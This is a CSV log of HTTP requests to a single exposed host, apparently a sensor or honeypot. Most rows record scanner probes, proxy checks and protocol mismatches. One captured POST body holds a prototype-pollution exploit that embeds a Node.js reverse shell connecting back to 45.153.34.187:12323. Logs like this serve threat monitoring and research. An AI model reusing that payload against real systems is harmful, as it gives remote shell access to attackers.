"ts","orig_h","resp_h","resp_p","method","host","uri","referrer","user_agent","status_code","request_body","response_body","community_id"
"2026-02-12 00:32:05.156","86.54.31.44","10.1.2.12",10009,"GET","","/","","",0,"","",""
"2026-02-12 00:32:03.647","86.54.31.44","10.1.2.12",10009,"GET","","/","","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",0,"","",""
"2026-02-12 00:29:58.922","185.226.197.75","10.1.2.12",3000,"GET","","/","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ",201,"","<html>
<body>Authenticate through /auth first.</body>
</html>

",""
"2026-02-12 00:29:01.907","94.75.213.71","10.1.2.12",8082,"CONNECT","","www.instagram.com:443","","Go-http-client/1.1",404,"","

<!DOCTYPE html>
<html lang=""en"">
  <head>
    <title>Airflow 404</title>
    <link rel=""icon"" type=""image/png"" href=""/static/pin_32.png"">
  </head>
  <body>
    <div style=""font-family: verdana; text-align: center; margin-top: 200px;"">
      <img src=""/static/pin_100.png"" width=""50px"" alt=""pin-logo"" />
      <h1>Airflow 404</h1>
      <p>Page cannot be found.</p>
      <a href=""/"">Return to the main page</a>
      <p>redact</p>
    </div>
  </body>
</html>",""
"2026-02-12 00:28:44.227","185.242.226.39","10.1.2.12",9002,"","","","","",400,"","400 Bad Request",""
"2026-02-12 00:28:43.762","185.242.226.39","10.1.2.12",9002,"","","","","",400,"","400 Bad Request",""
"2026-02-12 00:28:43.286","185.242.226.39","10.1.2.12",9002,"GET","","/","","",200,"","<!doctype html><html lang=""en""><head><meta charset=""utf-8""/><base href=""/""/><meta content=""width=device-width,initial-scale=1"" name=""viewport""/><meta content=""#081C42"" media=""(prefers-color-scheme: light)"" name=""theme-color""/><meta content=""#081C42"" media=""(prefers-color-scheme: dark)"" name=""theme-color""/><meta content=""MinIO Console"" name=""description""/><meta name=""minio-license"" content=""agpl""/><link href=""./styles/root-styles.css"" rel=""stylesheet""/><link href=""./apple-icon-180x180.png"" rel=""apple-touch-icon"" sizes=""180x180""/><link href=""./favicon-32x32.png"" rel=""icon"" sizes=""32x32"" type=""image/png""/><link href=""./favicon-96x96.png"" rel=""icon"" sizes=""96x96"" type=""image/png""/><link href=""./favicon-16x16.png"" rel=""icon"" sizes=""16x16"" type=""image/png""/><link href=""./manifest.json"" rel=""manifest""/><link color=""#3a4e54"" href=""./safari-pinned-tab.svg"" rel=""mask-icon""/><title>MinIO Console</title><script defer=""defer"" src=""./static/js/main.bb7c7604.js""></script><link href=""./static/css/main.e60e4760.css"" rel=""styl",""
"2026-02-12 00:28:42.818","185.242.226.39","10.1.2.12",9002,"","","","","",400,"","400 Bad Request",""
"2026-02-12 00:28:24.572","147.185.133.186","10.1.2.12",2323,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:28:05.420","8.221.140.90","10.1.2.12",9014,"GET","","/","","curl/7.64.1",0,"","",""
"2026-02-12 00:27:58.083","45.153.34.187","10.1.2.12",3000,"POST","","/","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",404,"{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();cl.connect(12323,'45.153.34.187',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});"",""_formData"":{""get"":""$1:constructor:constructor""}}}""$@0""","",""
"2026-02-12 00:27:38.201","147.185.132.178","10.1.2.12",8097,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:27:13.504","44.220.185.91","10.1.2.12",8081,"GET","","/","","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",0,"","",""
"2026-02-12 00:27:09.203","44.220.185.91","10.1.2.12",8081,"GET","","/","","Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/57.0.3060.78 Safari/537.32",0,"","",""
"2026-02-12 00:27:07.788","44.220.185.91","10.1.2.12",8081,"GET","","/","","Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/57.0.3060.78 Safari/537.32",0,"","",""
"2026-02-12 00:26:45.937","185.242.226.46","10.1.2.12",2204,"GET","","/","","",0,"","",""
"2026-02-12 00:26:32.050","94.75.213.71","10.1.2.12",8080,"CONNECT","","www.instagram.com:443","","Go-http-client/1.1",404,"","<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",""
"2026-02-12 00:26:12.003","185.242.226.45","10.1.2.12",8090,"GET","","/","","",0,"","",""
"2026-02-12 00:26:08.843","147.185.133.215","10.1.2.12",9756,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:25:11.556","162.216.150.27","10.1.2.12",9281,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:24:09.651","147.185.132.64","10.1.2.12",2379,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:22:33.683","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:32.602","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:32.385","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'SSH-2.0-Go'
     ^",""
"2026-02-12 00:22:31.303","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:30.219","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:29.101","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:28.082","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:26.966","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:25.843","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01'
    ^",""
"2026-02-12 00:22:05.457","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b':'
    ^",""
"2026-02-12 00:21:55.192","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'ZG'
    ^",""
"2026-02-12 00:21:55.015","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b''
    ^",""
"2026-02-12 00:21:53.999","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b''
    ^",""
"2026-02-12 00:21:33.644","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01\x01\xb6\x01'
    ^",""
"2026-02-12 00:21:32.770","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01\x01\x9f\x01'
    ^",""
"2026-02-12 00:21:32.445","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01\x01\xa9\x01'
    ^",""
"2026-02-12 00:21:31.559","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x01\x01\xa9\x01'
    ^",""
"2026-02-12 00:21:31.285","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x02\x01\x9c\x01'
    ^",""
"2026-02-12 00:21:30.305","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x03\x01\x9b\x01'
    ^",""
"2026-02-12 00:21:30.133","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x03\x01J\x01'
    ^",""
"2026-02-12 00:21:29.151","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x03\x01X\x01'
    ^",""
"2026-02-12 00:21:27.969","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x03\x01\xa7\x01'
    ^",""
"2026-02-12 00:21:26.051","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x16\x03\x03\x01\xa7\x01'
    ^",""
"2026-02-12 00:21:04.624","139.99.74.120","10.1.2.12",80,"GET","","/","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",200,"","<!DOCTYPE html>

<html dir=""ltr"" lang=""en"" prefix=""content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# "">
<head>
<meta charset=""utf-8""/>
<meta content=""Drupal 8 (https://www.drupal.org)"" name=""Generator""/>
<meta content=""width"" name=""MobileOptimized""/>
<meta content=""true"" name=""HandheldFriendly""/>
<meta content=""width=device-width, initial-scale=1.0"" name=""viewport""/>
<link href=""/core/misc/favicon.ico"" rel=""shortcut icon"" type=""image/vnd.microsoft.icon""/>
<link href=""/rss.xml"" rel=""alternate"" title="""" type=""application/rss+xml""/>
<title>Welcome to user's Site | user's Site</title>
<link href=""/sites/default/files/css/A.css_R_6vm3WffQ760L7tOso1MrCvb2yhkuMBF96k0UhZ_dw.css,,qpdgcng+css_1Vs-se15DhDFHRhxIEw",""
"2026-02-12 00:21:03.181","139.99.74.120","10.1.2.12",443,"GET","","/","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",400,"","Client sent an HTTP request to an HTTPS server.
",""
"2026-02-12 00:20:54.223","139.99.74.120","10.1.2.12",80,"POST","","/ipp","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",404,"\x02\x01\x00\x0b\x00\x00\x00\x01\x01G\x00\x12attributes-charset\x00\x05utf-8H\x00\x1battributes-natural-language\x00\x05en-usE\x00\x0bprinter-uri\x00\x1bipp://211.115.206.12:80/ippD\x00\x14requested-attributes\x00\x03all\x03","<!DOCTYPE html>

<html dir=""ltr"" lang=""en"" prefix=""content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# "">
<head>
<meta charset=""utf-8""/>
<meta content=""Drupal 8 (https://www.drupal.org)"" name=""Generator""/>
<meta content=""width"" name=""MobileOptimized""/>
<meta content=""true"" name=""HandheldFriendly""/>
<meta content=""width=device-width, initial-scale=1.0"" name=""viewport""/>
<link href=""/core/misc/favicon.ico"" rel=""shortcut icon"" type=""image/vnd.microsoft.icon""/>
<title>Page not found | user's Site</title>
<link href=""/sites/default/files/css/css_5Mz0wpOL20s_SQKXnhCWyA5ZJOgQQg26tUyGV0jHiCA.css?pdgcng"" media=""all"" rel=""stylesheet""/>
<link href=""/sites/default/files/css/css_1Vs-se15DhDFHRhxIEwgG9PQN6dfdJOpBMSoiT",""
"2026-02-12 00:20:53.602","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b''
    ^",""
"2026-02-12 00:20:52.836","139.99.74.120","10.1.2.12",443,"POST","","/ipp","","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",400,"\x02\x01\x00\x0b\x00\x00\x00\x01\x01G\x00\x12attributes-charset\x00\x05utf-8H\x00\x1battributes-natural-language\x00\x05en-usE\x00\x0bprinter-uri\x00\x1cipp://211.115.206.12:443/ippD\x00\x14requested-attributes\x00\x03all\x03","Client sent an HTTP request to an HTTPS server.
",""
"2026-02-12 00:20:52.687","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b''
    ^",""
"2026-02-12 00:20:41.082","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x03'
    ^",""
"2026-02-12 00:20:40.309","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x03'
    ^",""
"2026-02-12 00:20:29.544","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x12\x01'
    ^",""
"2026-02-12 00:20:28.555","139.99.74.120","10.1.2.12",80,"","","","","",0,"","",""
"2026-02-12 00:20:28.553","139.99.74.120","10.1.2.12",80,"fox","","a 1 -1 fox hell","","",400,"","Invalid method encountered:

  b'fox a 1 -1 fox hello\n{\nfox.version=s:1.0\nid=i:1\nhostName=s:xpvm-0omdc01xmy\nhostAddress=s:192.168.1.125\napp.name=s:Workbench\napp.version=s:3.7.44\nvm.name=s:Java HotSpot(TM) Server VM\nvm.version=s:20.4-b02\nos.name=s:Windows XP\nos.version=s:5.1\nlang=s:en\ntimeZone=s:America/Los_Angeles;-28800000;3600000;02:00:00.000,wall,march,8,on or after,sunday,undefined;02:00:00.000,wall,november,1,on or after,sunday,undefined\nhostId=s:Win-99CB-D49D-5442-07BB\nvmUuid=s:8b530bc8-76c5-4139-a2ea-0fabd394d305\nbrandId=s:vykon\n};;\n'
    ^",""
"2026-02-12 00:20:27.633","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'*1'
    ^",""
"2026-02-12 00:20:26.552","139.99.74.120","10.1.2.12",80,"","","","","",400,"","Invalid method encountered:

  b'\x05d\x05\xc9'
    ^",""
"2026-02-12 00:19:34.507","45.142.154.43","10.1.2.12",10000,"GET","","/","","",0,"","",""
"2026-02-12 00:19:33.422","45.142.154.43","10.1.2.12",10000,"GET","","/","","NTRIP GNSSInternetRadio",0,"","",""
"2026-02-12 00:18:57.909","205.210.31.176","10.1.2.12",9444,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:18:41.666","45.194.92.199","10.1.2.12",7000,"GET","","/","","Hello World",0,"","",""
"2026-02-12 00:17:56.988","162.216.149.129","10.1.2.12",29017,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:17:51.555","94.75.213.71","10.1.2.12",8080,"CONNECT","","www.instagram.com:443","","Go-http-client/1.1",404,"","<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",""
"2026-02-12 00:16:33.006","94.75.213.71","10.1.2.12",8082,"CONNECT","","www.instagram.com:443","","Go-http-client/1.1",404,"","

<!DOCTYPE html>
<html lang=""en"">
  <head>
    <title>Airflow 404</title>
    <link rel=""icon"" type=""image/png"" href=""/static/pin_32.png"">
  </head>
  <body>
    <div style=""font-family: verdana; text-align: center; margin-top: 200px;"">
      <img src=""/static/pin_100.png"" width=""50px"" alt=""pin-logo"" />
      <h1>Airflow 404</h1>
      <p>Page cannot be found.</p>
      <a href=""/"">Return to the main page</a>
      <p>redact</p>
    </div>
  </body>
</html>",""
"2026-02-12 00:15:10.455","64.62.156.52","10.1.2.12",30005,"GET","","/","","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",0,"","",""
"2026-02-12 00:14:57.151","162.216.150.151","10.1.2.12",18017,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:14:55.014","138.68.51.42","10.1.2.12",3340,"OPTIONS","","sip:nm SIP/2.","","",0,"","",""
"2026-02-12 00:14:49.388","138.68.51.42","10.1.2.12",3340,"GET","","/nice ports,/Trinity.txt.bak","","",0,"","",""
"2026-02-12 00:14:34.639","138.68.51.42","10.1.2.12",3340,"OPTIONS","","/ RTSP/1.","","",0,"","",""
"2026-02-12 00:14:33.295","138.68.51.42","10.1.2.12",3340,"OPTIONS","","/","","",0,"","",""
"2026-02-12 00:14:31.952","138.68.51.42","10.1.2.12",3340,"GET","","/","","",0,"","",""
"2026-02-12 00:14:16.290","162.216.149.53","10.1.2.12",9869,"GET","","/","","Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",0,"","",""
"2026-02-12 00:13:51.196","204.76.203.18","10.1.2.12",8080,"GET","","/backup/","","",404,"","<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",""
"2026-02-12 00:13:39.630","8.219.70.112","10.1.2.12",8082,"","","","","",400,"","<html>
  <head>
    <title>Bad Request</title>
  </head>
  <body>
    <h1><p>Bad Request</p></h1>
    Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
  </body>
</html>
",""
"2026-02-12 00:11:17.041","10.212.134.200","10.1.2.12",8123,"POST","","/?add_http_cors_header=1&log_queries=1&output_format_json_quote_64bit_integers=1","http://10.1.2.12:8124/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",200,"SELECT name,is_aggregate from system.functions

 FoRmAt JSON","{
	""meta"":
	[
		{
			""name"": ""name"",
			""type"": ""String""
		},
		{
			""name"": ""is_aggregate"",
			""type"": ""UInt8""
		}
	],

	""data"":
	[
		{
			""name"": ""roundBankers"",
			""is_aggregate"": 0
		},
		{
			""name"": ""trunc"",
			""is_aggregate"": 0
		},
		{
			""name"": ""ceil"",
			""is_aggregate"": 0
		},
		{
			""name"": ""floor"",
			""is_aggregate"": 0
		},
		{
			""name"": ""exp"",
			""is_aggregate"": 0
		},
		{
			""name"": ""replaceRegexpAll"",
			""is_aggregate"": 0
		},
		{
			""name"": ""toDayOfMonth"",
			""is_aggregate"": 0
		},
		{
			""name"": ""icebergBucket"",
			""is_aggregate"": 0
		},
		{
			""name"": ""HMAC"",
			""is_aggregate"": 0
		},
		{
			""name"": ""JSONDynamicPathsWithTypes"",
			""is_aggregate"": 0
		},
		{
			""name"": ""JSONDynamicPaths"",
			""is_aggregate"": 0
		},
		{
			""name"": ""JSONAllPathsWithTypes"",
			""is_aggregate"": 0
		},
		{
			""name"": ""JSONAllPaths"",
			""is_aggregate"": 0
		},
		{
			""name"": ""isDistinctFrom"",
			""is_aggregate"": 0
		},
		{
			""name"": ""addDays"",
			""is_aggregate"": 0
		},
		{
			""name"": ""perimeterSpherical"",
			""is_agg",""
"2026-02-12 00:11:17.014","10.212.134.200","10.1.2.12",8123,"POST","","/?add_http_cors_header=1&log_queries=1&output_format_json_quote_64bit_integers=1","http://10.1.2.12:8124/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",200,"SELECT name,key,attribute.names,attribute.types from system.dictionaries ARRAY JOIN attribute ORDER BY name,attribute.names

 FoRmAt JSON","{
	""meta"":
	[
		{
			""name"": ""name"",
			""type"": ""String""
		},
		{
			""name"": ""key"",
			""type"": ""String""
		},
		{
			""name"": ""attribute.names"",
			""type"": ""String""
		},
		{
			""name"": ""attribute.types"",
			""type"": ""String""
		}
	],

	""data"":
	[

	],

	""rows"": 0,

	""statistics"":
	{
		""elapsed"": 0.00314429,
		""rows_read"": 0,
		""bytes_read"": 0
	}
}
",""
